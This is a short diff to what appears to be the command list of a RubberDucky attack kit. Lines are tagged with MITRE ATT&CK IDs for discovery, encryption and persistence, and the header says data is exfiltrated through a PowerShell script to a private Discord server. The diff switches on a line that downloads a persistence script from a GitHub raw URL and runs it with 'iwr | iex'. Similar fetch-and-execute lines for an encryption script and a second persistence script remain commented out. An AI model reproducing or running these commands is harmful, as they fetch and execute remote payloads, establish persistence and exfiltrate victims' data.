@@ -1,7 +1,7 @@
 ##Resource Development, Initial Access, Execution conducted by RubberDucky
 ##Exfiltration, Command and Control done by gitDiscordC2.ps1 - Data is exfiltrated to private discord server
 ##Discovery----------------------------------------------------------------------------
-#T1083, T1057, T1082, T1007
+##T1083, T1057, T1082, T1007
 !!hostname
 !!whoami
 ##systeminfo
@@ -17,7 +17,7 @@
 ##!!iwr https://raw.githubusercontent.com/JH517/DuckyPico/refs/heads/main/encrypt.ps1 | iex
 ##Persistance----------------------------------------------------------------------------
 ##T1547 Boot or Logon Autostart Execution
-##!!iwr https://raw.githubusercontent.com/JH517/DuckyPico/refs/heads/main/persist.ps1 | iex
+!!iwr https://raw.githubusercontent.com/JH517/DuckyPico/refs/heads/main/persist.ps1 | iex
 ##T1140 Deobfuscate/Decode Files or Information
 ##!!iwr https://raw.githubusercontent.com/JH517/DuckyPico/refs/heads/main/persist2.ps1 | iex
 ##T1053 Scheduled Task/Job
